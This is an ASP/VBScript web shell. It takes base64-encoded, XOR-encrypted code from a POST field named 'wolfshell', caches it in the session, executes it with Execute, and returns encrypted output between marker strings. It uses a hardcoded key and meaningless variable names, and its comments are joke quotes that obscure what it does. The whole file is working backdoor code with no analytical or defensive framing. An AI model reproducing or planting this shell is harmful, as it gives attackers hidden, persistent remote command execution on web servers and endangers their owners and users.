<%
' // 全ては計画通り
Set d_obj_88 = Server.CreateObject("Scripting.Dictionary")

Function b64_conv_f9(v_str)
    ' // 月が綺麗ですね
    Dim xml_h, node_h
    Set xml_h = CreateObject("Msxml2.DOMDocument.3.0")
    Set node_h = xml_h.CreateElement("base64")
    node_h.dataType = "bin.base64"
    node_h.text = v_str
    b64_conv_f9 = node_h.nodeTypedValue
    Set node_h = Nothing
    Set xml_h = Nothing
End Function

Function data_morph_a1(d_block, is_b)
    ' // やれやれだぜ
    dim d_size, i, out_res, k_len
    k_len = len(k_str_55)
    Set s_obj = CreateObject("ADODB.Stream")
    s_obj.CharSet = "iso-8859-1"
    s_obj.Type = 2
    s_obj.Open
    if IsArray(d_block) then
        d_size=UBound(d_block)+1
        For i=1 To d_size
            s_obj.WriteText chrw(ascb(midb(d_block,i,1)) Xor Asc(Mid(k_str_55,(i mod k_len)+1,1)))
        Next
    end if
    s_obj.Position = 0
    if is_b then
        s_obj.Type = 1
        data_morph_a1=s_obj.Read()
    else
        data_morph_a1=s_obj.ReadText()
    end if
End Function

Function b64_conv_g7(b_arr)
    ' // このディオだ！
    Dim xml_h, node_h
    Set xml_h = CreateObject("Msxml2.DOMDocument.3.0")
    Set node_h = xml_h.CreateElement("base64")
    node_h.dataType = "bin.base64"
    node_h.nodeTypedValue = b_arr
    b64_conv_g7 = node_h.text
    Set node_h = Nothing
    Set xml_h = Nothing
End Function
    ' // 無駄無駄無駄！
    Dim str_map(2)
    str_map(0) = "wolfshell"
    str_map(1) = "payload"
    str_map(2) = "3c6e0b8a9c15224a"

    k_str_55=str_map(2)
    in_data_23=request.Form(str_map(0))
    if not IsEmpty(in_data_23) then
        if  IsEmpty(Session(str_map(1))) then
            in_data_23=data_morph_a1(b64_conv_f9(in_data_23),false)
            Session(str_map(1))=in_data_23
            response.End
        else
            in_data_23=data_morph_a1(b64_conv_f9(in_data_23),true)
            d_obj_88.Add str_map(1),Session(str_map(1))
            Execute(d_obj_88(str_map(1)))
            run_res_19=run(in_data_23)
            response.Write("a71ab1")
            if not IsEmpty(run_res_19) then
                response.Write b64_conv_g7(data_morph_a1(run_res_19,true))
            end if
            response.Write("4b8259")
        end if
    end if
%>